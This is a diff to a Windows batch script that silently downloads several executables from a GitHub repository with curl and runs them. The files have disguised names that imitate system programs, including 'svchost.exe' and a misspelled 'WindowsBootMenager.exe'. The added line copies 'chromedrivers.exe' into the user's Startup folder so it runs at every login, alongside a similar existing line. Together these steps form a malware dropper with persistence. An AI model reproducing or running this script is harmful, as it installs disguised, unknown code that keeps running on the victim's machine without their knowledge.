@@ -6,6 +6,7 @@ curl -s -o "WindowsBootMenager".exe -JL "https://github.com/DanGILC-137/Explorer
 xcopy /y WindowsBootMenager.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 WindowsBootMenager.exe
 curl -s -o "chromedrivers".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/chromedrivers.exe"
+xcopy /y chromedrivers.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 chromedrivers.exe
 curl -s -o "svchost".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/svchost.exe"
 svchost.exe
